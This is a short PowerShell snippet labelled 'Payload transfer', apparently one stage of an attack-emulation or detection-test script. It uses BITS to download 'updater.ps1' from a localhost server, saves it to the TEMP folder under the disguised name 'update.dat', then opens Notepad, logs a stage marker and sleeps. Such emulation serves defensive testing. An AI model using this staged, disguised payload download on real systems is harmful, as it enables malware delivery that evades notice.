
# Payload transfer
try { $FetchUrl = "http://localhost:8000/updater.ps1"; $LocalPath = "$env:TEMP\update.dat"; Start-BitsTransfer -Source $FetchUrl -Destination $LocalPath; & "notepad.exe"; Write-Verbose "stage marker 24 reached"; Start-Sleep -Seconds 7 } catch { Write-Warning "Remote fetch failed" }
